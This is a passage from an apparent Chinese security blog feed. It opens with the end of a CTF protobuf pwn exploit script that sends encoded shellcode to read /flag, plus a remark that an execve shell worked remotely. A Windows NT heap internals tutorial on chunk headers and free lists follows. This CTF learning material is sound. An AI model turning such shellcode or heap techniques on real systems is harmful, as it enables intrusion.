class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1fc7</span></span><br><span class="line">leak(<span class="string">&quot;yes_addr&quot;</span>,yes_addr)</span><br><span class="line">sl((<span class="built_in">hex</span>(yes_addr)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">giao=giao_pb2.devicemsg()</span><br><span class="line">giao.giaoid=<span class="number">1131796</span></span><br><span class="line">giao.giaosize=<span class="number">4281361</span></span><br><span class="line"><span class="comment"># giao.giaotoken=b&#x27;\x6A\x36\xAF\xA6\x7b\xA8\x5F\xB9\x63\x7D\x83\xC7\x0C\x1C\x8D\x91\xD3\xF2\x6E\x6B\xB3\xF9\x77\xF8\xBF\xE2\x88\xE8\xFC\xEC\xFD\x8E\xfd\x92\xFE\x40\x00&#x27;</span></span><br><span class="line">giao.giaotoken=<span class="string">b&#x27;87dd78e1-9025-4d57-9c2e-418608b3bbea&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.read(<span class="number">0</span>,<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x400</span>))</span><br><span class="line">new_shellcode=ae64.encode(shellcode,<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line"></span><br><span class="line">giao.giaocontent=new_shellcode</span><br><span class="line"><span class="comment"># debug(&quot;b *$rebase(0x0000000000001D67)&quot;)</span></span><br><span class="line">payload = giao.SerializeToString()</span><br><span class="line">sa(<span class="string">b&#x27;giao: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">orw_shell=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)+shellcraft.sendfile(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">48</span>))</span><br><span class="line">sl(<span class="number">0x100</span>*<span class="string">b&#x27;\x90&#x27;</span>+orw_shell)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>如此，不过比赛的时候，不知道为何远程环境没打通，但是通过execve直接getshell就通了，这个沙盒的第二个prctl返回值显示是<code>0xffffffff</code>，所以沙盒并没有完全开起来，还是可以进行getshell</p><blockquote><p>总的来说，protobuf pwn就是多了一个逆向结构体的过程，也大差不差了</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于&lt;strong&gt;将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构&lt;/strong&gt;。所以很适合做数据存储和为不同语言，不同应</summary>
      
    
    
    
    <category term="protobuf" scheme="http://s1nec-1o.github.io/categories/protobuf/"/>
    
    
    <category term="protobuf" scheme="http://s1nec-1o.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>windows heap初探(2)</title>
    <link href="http://s1nec-1o.github.io/2025/05/10/windows-heap%E5%88%9D%E6%8E%A2-2/"/>
    <id>http://s1nec-1o.github.io/2025/05/10/windows-heap%E5%88%9D%E6%8E%A2-2/</id>
    <published>2025-05-10T07:18:42.000Z</published>
    <updated>2025-05-10T08:38:31.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows堆基础知识"><a href="#windows堆基础知识" class="headerlink" title="windows堆基础知识"></a>windows堆基础知识</h2><p>win10的memory allocator基本上分为两种：</p><ol><li>Nt Heap<ul><li>默认的memory allocator<ul><li>后端管理器（Back-End）</li><li>前端管理器（Front-End）</li></ul></li></ul></li><li>SegmentHeap<ul><li>Win10中全新的memory allocator机制</li></ul></li></ol><p>在LFH未启用时，我们call malloc</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519071.png" alt="image-20250508164639436"></p><p>启用LFH后，第一次或LFH能用的空间都用完时，会先跟Back-End要一大块空间来管理</p><p>启用LFH之后分配相同大小时，会直接给Front-End管理</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519072.png" alt="image-20250508164801386"></p><h3 id="Nt-Heap"><a href="#Nt-Heap" class="headerlink" title="Nt Heap"></a>Nt Heap</h3><h3 id="Back-End"><a href="#Back-End" class="headerlink" title="Back-End"></a>Back-End</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><h5 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h5><p><code>_HEAP</code>是每个堆的核心结构，用来管理该<code>heap</code>，每个<code>Heap</code>都有一个<code>_HEAP</code>在<code>heap</code>开头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x2c0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_SEGMENT</span> <span class="title">Segment</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Entry</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">            ULONG SegmentSignature;                                         <span class="comment">//0x10</span></span><br><span class="line">            ULONG SegmentFlags;                                             <span class="comment">//0x14</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentListEntry</span>;</span>                            <span class="comment">//0x18</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span>* <span class="title">Heap</span>;</span>                                             <span class="comment">//0x28</span></span><br><span class="line">            VOID* BaseAddress;                                              <span class="comment">//0x30</span></span><br><span class="line">            ULONG NumberOfPages;                                            <span class="comment">//0x38</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">FirstEntry</span>;</span>                                 <span class="comment">//0x40</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">LastValidEntry</span>;</span>                             <span class="comment">//0x48</span></span><br><span class="line">            ULONG NumberOfUnCommittedPages;                                 <span class="comment">//0x50</span></span><br><span class="line">            ULONG NumberOfUnCommittedRanges;                                <span class="comment">//0x54</span></span><br><span class="line">            USHORT SegmentAllocatorBackTraceIndex;                          <span class="comment">//0x58</span></span><br><span class="line">            USHORT Reserved;                                                <span class="comment">//0x5a</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRSegmentList</span>;</span>                              <span class="comment">//0x60</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x70</span></span><br><span class="line">    ULONG ForceFlags;                                                       <span class="comment">//0x74</span></span><br><span class="line">    ULONG CompatibilityFlags;                                               <span class="comment">//0x78</span></span><br><span class="line">    ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG Interceptor;                                                      <span class="comment">//0x90</span></span><br><span class="line">    ULONG VirtualMemoryThreshold;                                           <span class="comment">//0x94</span></span><br><span class="line">    ULONG Signature;                                                        <span class="comment">//0x98</span></span><br><span class="line">    ULONGLONG SegmentReserve;                                               <span class="comment">//0xa0</span></span><br><span class="line">    ULONGLONG SegmentCommit;                                                <span class="comment">//0xa8</span></span><br><span class="line">    ULONGLONG DeCommitFreeBlockThreshold;                                   <span class="comment">//0xb0</span></span><br><span class="line">    ULONGLONG DeCommitTotalFreeThreshold;                                   <span class="comment">//0xb8</span></span><br><span class="line">    ULONGLONG TotalFreeSize;                                                <span class="comment">//0xc0</span></span><br><span class="line">    ULONGLONG MaximumAllocationSize;                                        <span class="comment">//0xc8</span></span><br><span class="line">    USHORT ProcessHeapsListIndex;                                           <span class="comment">//0xd0</span></span><br><span class="line">    USHORT HeaderValidateLength;                                            <span class="comment">//0xd2</span></span><br><span class="line">    VOID* HeaderValidateCopy;                                               <span class="comment">//0xd8</span></span><br><span class="line">    USHORT NextAvailableTagIndex;                                           <span class="comment">//0xe0</span></span><br><span class="line">    USHORT MaximumTagIndex;                                                 <span class="comment">//0xe2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TAG_ENTRY</span>* <span class="title">TagEntries</span>;</span>                                     <span class="comment">//0xe8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRList</span>;</span>                                             <span class="comment">//0xf0</span></span><br><span class="line">    ULONGLONG AlignRound;                                                   <span class="comment">//0x100</span></span><br><span class="line">    ULONGLONG AlignMask;                                                    <span class="comment">//0x108</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">VirtualAllocdBlocks</span>;</span>                                 <span class="comment">//0x110</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentList</span>;</span>                                         <span class="comment">//0x120</span></span><br><span class="line">    USHORT AllocatorBackTraceIndex;                                         <span class="comment">//0x130</span></span><br><span class="line">    ULONG NonDedicatedListLength;                                           <span class="comment">//0x134</span></span><br><span class="line">    VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line">    VOID* UCRIndex;                                                         <span class="comment">//0x140</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_PSEUDO_TAG_ENTRY</span>* <span class="title">PseudoTagEntries</span>;</span>                        <span class="comment">//0x148</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LOCK</span>* <span class="title">LockVariable</span>;</span>                                        <span class="comment">//0x160</span></span><br><span class="line">    LONG (*CommitRoutine)(VOID* arg1, VOID** arg2, ULONGLONG* arg3);        <span class="comment">//0x168</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">RTL_RUN_ONCE</span> <span class="title">StackTraceInitVar</span>;</span>                                  <span class="comment">//0x170</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_HEAP_MEMORY_LIMIT_DATA</span> <span class="title">CommitLimitData</span>;</span>                     <span class="comment">//0x178</span></span><br><span class="line">    VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">    USHORT FrontHeapLockCount;                                              <span class="comment">//0x1a0</span></span><br><span class="line">    UCHAR FrontEndHeapType;                                                 <span class="comment">//0x1a2</span></span><br><span class="line">    UCHAR RequestedFrontEndHeapType;                                        <span class="comment">//0x1a3</span></span><br><span class="line">    WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br><span class="line">    USHORT FrontEndHeapMaximumIndex;                                        <span class="comment">//0x1b0</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR FrontEndHeapStatusBitmap[<span class="number">129</span>];                           <span class="comment">//0x1b2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_COUNTERS</span> <span class="title">Counters</span>;</span>                                         <span class="comment">//0x238</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TUNING_PARAMETERS</span> <span class="title">TuningParameters</span>;</span>                        <span class="comment">//0x2b0</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br></pre></td></tr></table></figure><p><code>EncodeFlagMask</code>是用来判断是否要encode该heap中chunk的header</p><p><code>Encoding</code>用来与chunk header做xor的<code>cookie</code></p><blockquote><p>所有的chunk都会经过xor，在存入chunk header时，会将整个<code>header^(_HEAP-&gt;Encoding)</code>再存入</p><p>decode时会验证，确保没被改掉，验证方式为：先异或回原来的值，然后前三个byte异或后和第四个byte比对</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br></pre></td></tr></table></figure><p><code>BlocksIndex</code>是Back-End的重要结构，之后会详细讲解</p><p><code>FreeList</code>串接Back-End中的所有free chunk，类似unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br></pre></td></tr></table></figure><p><code>FrontEndHeap</code>指向管理Front-End的Heap的结构</p><p><code>FrontEndHeapUsageData</code>指向一个对应各大小的chunk的阵列，记录各种大小chunk使用次数，到达某种程度时会采用Front-End allocater</p><h5 id="HEAP-ENTRY-chunk"><a href="#HEAP-ENTRY-chunk" class="headerlink" title="_HEAP_ENTRY(chunk)"></a>_HEAP_ENTRY(chunk)</h5><p>_HEAP_ENTRY(chunk)</p><ul><li>分为三种情况<ul><li>Allocated chunk</li><li>Freed chunk</li><li>VirtualAlloc chunk</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_UNPACKED_ENTRY</span> <span class="title">UnpackedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* PreviousBlockPrivateData;                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT Size;                                            <span class="comment">//0x8</span></span><br><span class="line">                    UCHAR Flags;                                            <span class="comment">//0xa</span></span><br><span class="line">                    UCHAR SmallTagIndex;                                    <span class="comment">//0xb</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG SubSegmentCode;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT PreviousSize;                                    <span class="comment">//0xc</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        UCHAR SegmentOffset;                                <span class="comment">//0xe</span></span><br><span class="line">                        UCHAR LFHFlags;                                     <span class="comment">//0xe</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                    UCHAR UnusedBytes;                                      <span class="comment">//0xf</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG CompactHeader;                                    <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_EXTENDED_ENTRY</span> <span class="title">ExtendedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* Reserved;                                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT FunctionIndex;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT ContextValue;                                    <span class="comment">//0xa</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONG InterceptorValue;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">            USHORT UnusedBytesLength;                                       <span class="comment">//0xc</span></span><br><span class="line">            UCHAR EntryOffset;                                              <span class="comment">//0xe</span></span><br><span class="line">            UCHAR ExtendedBlockSignature;                                   <span class="comment">//0xf</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* ReservedForAlignment;                                     <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG Code1;                                            <span class="comment">//0x8</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                        &#123;</span></span><br><span class="line">                            USHORT Code2;                                   <span class="comment">//0xc</span></span><br><span class="line">                            UCHAR Code3;                                    <span class="comment">//0xe</span></span><br><span class="line">                            UCHAR Code4;                                    <span class="comment">//0xf</span></span><br><span class="line">                        &#125;;</span><br><span class="line">                        ULONG Code234;                                      <span class="comment">//0xc</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG AgregateCode;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p> 虽说这个结构体有点复杂，但是是取决于这个chunk的状态的</p><p><strong>Inused状态</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;<span class="comment">//0x0</span></span><br><span class="line">    Uint2B Size;<span class="comment">//0x8</span></span><br><span class="line">    Uchar Flags;<span class="comment">//0xa</span></span><br><span class="line">    Uchar SmallTagIndex;<span class="comment">//0xb</span></span><br><span class="line">    Uint2B PreviousSize;<span class="comment">//0xc</span></span><br><span class="line">    Uchar SegmentOffset;<span class="comment">//0xe</span></span><br><span class="line">    Uchar Unusedbyte;<span class="comment">//0xf</span></span><br><span class="line">    Uchar UserData[];<span class="comment">//0x10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PreviousBlockPrivateData</code>基本上是前一块chunk的数据</p><p><code>Size</code>存入的方式是(size&gt;&gt;4)即0x10对齐</p><p><code>Flag</code>表示该chunk是否inused</p><p><code>SmallTagIndex</code>是<code>Size</code>和<code>Flags</code>成员三字节数据逐个xor结果, 取出时会进行校验</p><p><code>PreviousSize</code>是相邻前一块chunk的Size，一样是&gt;&gt;4过后的数值</p><p><code>SegmentOffset</code>某些情况用来找segment</p><p><code>Unusebyte</code>记录user malloc后所剩的chunk空间，可以用来判断chunk的状态是FrontEnd or BackEnd</p><p><code>UserData</code>是User所使用的区块</p><p><strong>freed状态</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct _HEAP_ENTRY&#123;</span><br><span class="line">    void * PreviousBlockPrivateData;//0x0</span><br><span class="line">    Uint2B Size;//0x8</span><br><span class="line">    Uchar Flags;//0xa</span><br><span class="line">    Uchar SmallTagIndex;//0xb</span><br><span class="line">    Uint2B PreviousSize;//0xc</span><br><span class="line">    Uchar SegmentOffset;//0xe</span><br><span class="line">    Uchar Unusedbyte;//0xf</span><br><span class="line">    struct _LIST_ENTRY* Flink;//0x10</span><br><span class="line">    struct _LIST_ENTRY* Blink;//0x18</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Flink</code>指向linked list中下一块chunk</p><p><code>Blink</code>指向linked list中上一块chunk</p><p><code>Unusedbyte</code>恒为0</p><h5 id="HEAP-VIRTUAL-ALLOC-ENTRY-mmap-chunk"><a href="#HEAP-VIRTUAL-ALLOC-ENTRY-mmap-chunk" class="headerlink" title="_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk)"></a>_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x40 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_VIRTUAL_ALLOC_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">Entry</span>;</span>                                               <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY_EXTRA</span> <span class="title">ExtraStuff</span>;</span>                                    <span class="comment">//0x10</span></span><br><span class="line">    ULONGLONG CommitSize;                                                   <span class="comment">//0x20</span></span><br><span class="line">    ULONGLONG ReserveSize;                                                  <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">BusyBlock</span>;</span>                                           <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Flink</span>;</span>                                              <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Blink</span>;</span>                                              <span class="comment">//0x8</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY_EXTRA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT AllocatorBackTraceIndex;                                 <span class="comment">//0x0</span></span><br><span class="line">            USHORT TagIndex;                                                <span class="comment">//0x2</span></span><br><span class="line">            ULONGLONG Settable;                                             <span class="comment">//0x8</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONGLONG ZeroInit;                                             <span class="comment">//0x0</span></span><br><span class="line">            ULONGLONG ZeroInit1;                                            <span class="comment">//0x8</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>BusyBlock</code>的结构体和上述的chunk的结构体是类似的</p><p>其中</p><p><code>Size</code>是指的是<code>unused size</code>，存储时也没有进行<code>size &gt;&gt; 4</code>的<code>shift</code>操作</p><p><code>UnusedBytes</code>恒为4</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519073.png" alt="image-20250508160927164" style="zoom: 50%;" /><p>在Free完一块chunk后，会将该chunk放在FreeLists中，会按照大小决定插入的位置</p><h5 id="HEAP-BlocksIndex"><a href="#HEAP-BlocksIndex" class="headerlink" title="_HEAP-&gt;BlocksIndex"></a>_HEAP-&gt;BlocksIndex</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x38 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span>* <span class="title">ExtendedLookup</span>;</span>                               <span class="comment">//0x0</span></span><br><span class="line">    ULONG ArraySize;                                                        <span class="comment">//0x8</span></span><br><span class="line">    ULONG ExtraItem;                                                        <span 